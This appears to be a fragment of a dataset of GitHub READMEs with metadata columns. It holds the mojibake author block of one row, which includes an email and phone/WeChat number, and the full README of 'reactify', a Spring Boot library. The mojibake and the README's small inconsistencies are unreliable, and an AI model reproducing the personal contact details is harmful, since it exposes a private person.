# ä½œè€…ä¿¡æ¯

- ä½œè€…ï¼šé™ˆæ€æº(WP)
- é‚®ç®±ï¼š2766694258@qq.com
- å¾®ä¿¡ï¼š15139467313
- å°±ç‚¹ç‚¹ğŸŒŸ Star ğŸŒŸ å…³æ³¨æ›´æ–°ï¼Œæ”¯æŒä¸‹ä½œè€…å°±å¯ä»¥äº†





",1,2,1,0.0,['http'],['http'],1.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
hoangtien2k3/reactify,main,"<h3 align=""center"">
<img src=""docs/images/reactify_banner.png"" alt=""Ezbuy"" width=""300"" />

<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">ğŸ“šDocs</a> |
<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">ğŸ’¬Chat</a> |
<a href=""https://github.com/hoangtien2k3/reactify/blob/main/docs/en/README.md"">âœ¨Live Demo</a>
</h3>

##

Reactify [a commons Java lib]() with spring boot framework, Supports using keycloak, filter, trace log, cached, minio
server, exception handler, validate and call API with webclient

This README provides quickstart instructions on running [`reactify`]() on bare metal project spring boot.

[![SonarCloud](https://sonarcloud.io/images/project_badges/sonarcloud-white.svg)](https://sonarcloud.io/summary/new_code?id=hoangtien2k3_reactify)

[![CircleCI](https://circleci.com/gh/hoangtien2k3/reactify.svg?style=svg)](https://app.circleci.com/pipelines/github/hoangtien2k3/reactify)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=hoangtien2k3_reactify&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=hoangtien2k3_reactify)
[![Lines of Code](https://sonarcloud.io/api/project_badges/measure?project=hoangtien2k3_reactify&metric=ncloc)](https://sonarcloud.io/summary/overall?id=hoangtien2k3_reactify)
[![GitHub Release](https://img.shields.io/github/v/release/hoangtien2k3/reactify?label=latest%20release)](https://mvnrepository.com/artifact/io.github.hoangtien2k3/reactify)
[![License](https://img.shields.io/badge/license-Apache--2.0-green.svg)](https://www.apache.org/licenses/LICENSE-2.0.html)
[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/9383/badge)](https://www.bestpractices.dev/projects/9383)
[![Build status](https://github.com/ponfee/commons-core/workflows/build-with-maven/badge.svg)](https://github.com/hoangtien2k3/reactify/actions)

## Download
Gradle is the only supported build configuration, so just add the dependency to your project build.gradle file:

â¬‡ï¸ Download Gradle and Maven

```kotlin
dependencies {
  implementation 'io.github.hoangtien2k3:reactify:$latest'
}
```

```maven
<dependency>
   <groupId>io.github.hoangtien2k3</groupId>
   <artifactId>reactify</artifactId>
   <version>${latest}</version>
</dependency>
```

The latest `reactify` version is: [![GitHub Release](https://img.shields.io/github/v/release/hoangtien2k3/reactify?label=latest)](https://mvnrepository.com/artifact/io.github.hoangtien2k3/reactify)

The latest stable lib `reactify` version is: latestVersion Click [here](https://central.sonatype.com/namespace/io.github.hoangtien2k3) for more information on reactify.

## Getting Started

1. Correct and complete setup to start the program `application.yml` or `application.properties`
   with [CONFIG](src/main/resources/application.yml)

2. The [reference documentation]() includes detailed [installation instructions]() as well as a
   comprehensive [getting started]() guide.

Here is a quick teaser of a complete Spring Boot application in Java:

```java
@SpringBootApplication
@ComponentScan(basePackages = {""io.hoangtien2k3.reactify.*""})
@ImportResource({""classpath*:applicationContext.xml""})
public class Example {

    @RequestMapping(""/"")
    String home() {
        return ""Hello World!"";
    }

    public static void main(String[] args) {
        SpringApplication.run(Example.class, args);
    }
}
```

## Contributing

If you would like to contribute to the development of this project, please follow our contribution guidelines.

![Alt](https://repobeats.axiom.co/api/embed/31a861bf21d352264c5c122808407abafb97b0ef.svg ""Repobeats analytics image"")


## Star History

<a href=""https://star-history.com/#hoangtien2k3/fw-commons&Timeline"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=hoangtien2k3/fw-commons&type=Timeline"" />
 </picture>
</a>

## Contributors âœ¨

<a href=""https://github.com/hoangtien2k3/reactify/graphs/contributors"">
  <img src=""https://contrib.rocks/image?repo=hoangtien2k3/reactify"" />
</a>

## License

This project is licensed under the [Apache License, Version 2.0](https://www.apache.org/licenses/LICENSE-2.0)

```
Apache License
Copyright (c) 2024 HoÃ ng Anh Tiáº¿n
```
",6,0,15,1.0,"['download', 'get', 'start', 'contribute', 'star', 'history', 'contributor', 'license']","['download', 'get', 'start', 'contribute', 'star']",3.0,"[com.diffplug.spotless:spotless-maven-plugin,com.mycila:license-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,2.0,1.0
